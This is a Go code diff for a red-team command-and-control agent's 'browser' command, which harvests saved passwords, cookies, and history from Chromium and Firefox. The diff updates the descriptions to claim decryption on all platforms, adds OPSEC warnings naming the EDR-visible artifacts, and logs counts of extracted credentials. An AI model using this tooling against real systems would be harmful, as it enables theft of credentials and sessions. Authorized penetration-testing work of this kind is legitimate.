@@ -11,12 +11,12 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "browser",
-		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, bookmarks, downloads, and Firefox cookies. (T1555.003, T1217)",
+		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. All platforms support password and cookie decryption: Windows via DPAPI, macOS via Keychain, Linux via Secret Service/peanuts fallback. (T1555.003, T1217)",
 		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks|downloads>] [-browser <all|chrome|edge|chromium|firefox>]",
 		Version:             5,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1555.003", "T1217"},
+		MitreAttackMappings: []string{"T1555.003", "T1217", "T1539"},
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
@@ -32,7 +32,7 @@ func init() {
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks", "downloads"},
-				Description:      "What to harvest: passwords (Windows Chromium only — DPAPI), cookies (Windows Chromium DPAPI; Firefox plaintext on all platforms), history (browsing URLs), autofill (form data), bookmarks (saved URLs), or downloads (download history).",
+				Description:      "What to harvest: passwords (Chromium decryption on all platforms), cookies (Chromium decryption on all platforms; Firefox plaintext), history (browsing URLs), autofill (form data), bookmarks (saved URLs), or downloads (download history).",
 				DefaultValue:     "history",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -58,7 +58,31 @@ func init() {
 			},
 		},
 		AssociatedBrowserScript: nil,
-		TaskFunctionOPSECPre:    nil,
+		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
+				action, _ := taskData.Args.GetStringArg("action")
+				browser, _ := taskData.Args.GetStringArg("browser")
+				msg := fmt.Sprintf("OPSEC WARNING: Browser credential extraction (%s", action)
+				if browser != "" {
+					msg += fmt.Sprintf(", target: %s", browser)
+				}
+				msg += "). Accesses browser profile databases (Login Data, Cookies, History). Windows: DPAPI decryption (CryptUnprotectData monitoring). macOS: Keychain access. Linux: secret-tool/keyring queries. EDR may flag SQLite database access in browser profile directories."
+				return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
+					TaskID:             taskData.Task.ID,
+					Success:            true,
+					OpsecPreBlocked:    false,
+					OpsecPreMessage:    msg,
+					OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+				}
+			},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: Browser credential extraction completed. DPAPI decryption, Keychain access, and SQLite reads of browser databases generate file access audit events. Harvested credentials registered in Mythic vault — rotate after engagement.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
+		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
 				return nil
@@ -137,6 +161,10 @@ func init() {
 				})
 			}
 			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			if len(creds) > 0 {
+				logOperationEvent(processResponse.TaskData.Task.ID,
+					fmt.Sprintf("[CREDENTIAL] browser extracted %d credentials from %s", len(creds), processResponse.TaskData.Callback.Host), true)
+			}
 			return response
 		},
 	})
